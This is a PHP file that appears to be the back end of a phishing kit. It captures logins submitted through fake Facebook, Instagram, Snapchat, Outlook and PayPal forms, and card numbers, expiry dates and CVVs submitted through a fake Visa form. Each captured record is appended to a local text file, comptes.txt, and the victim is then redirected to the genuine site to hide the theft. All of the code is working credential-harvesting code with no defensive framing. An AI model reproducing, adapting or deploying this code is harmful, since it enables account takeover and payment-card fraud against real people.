<?php 
if (isset($_POST['connect']) || isset($_POST['connect2']) || isset($_POST['pay']) || isset($_POST['submit_visa']) || isset($_POST['snapchat_bt']) || isset($_POST['outlook']) ) {

if (isset($_POST['connect'])) {
	$service="facebook";
}

if (isset($_POST['snapchat_bt'])) {
	$service="snapchat";
}

if (isset($_POST['outlook'])) {
	$service="outlook";
}

if (isset($_POST['connect2'])) {
	$service="instagram";
}

if (isset($_POST['pay'])) {
	$service="paypal";
}
if (isset($_POST['submit_visa'])) {
	$service="visa";
	$n_carte=$_POST['n_carte'];
	$date_exp_mois=$_POST['date_exp_mois'];
	$date_exp_annee=$_POST['date_exp_annee'];
	$cvv=$_POST['cvv'];
	$email="[".$n_carte ." | ".$date_exp_mois." / ".$date_exp_annee."]";
	$password=$cvv;
}else{
	$email=$_POST['email'];
	$password=$_POST['password'];
}



$date=date("Y-m-d");
 $fichier = fopen('comptes.txt', 'a');
  fwrite($fichier, $date .'|'. $service .'| Email = '. $email .'| Password = '. $password."\n" );
if (isset($_POST['connect'])) {
	header('location:https://m.facebook.com');
}
if (isset($_POST['connect2'])) {
	header('location:https://www.instagram.com');
}
if (isset($_POST['pay'])) {
	header('location:https://www.paypal.com/tn/signin');
}
if (isset($_POST['outlook'])) {
	header('location:https://outlook.office.com');
}
if (isset($_POST['submit_visa'])) {
	header('location:https://usa.visa.com/pay-with-visa/find-card/apply-credit-card');
}

if (isset($_POST['snapchat_bt'])) {
	header('location:https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome');
}

}

if (isset($_POST['app'])) {
	$service=$_POST['service'];
	$fichier = fopen('service.txt', 'a');
  fwrite($fichier, $service);
  header('location:index.php');
}



if (isset($_POST['outlook1'])) {
	$email=$_POST['email'];
	header('location:outlook.php?email='.$email.'');
}

?>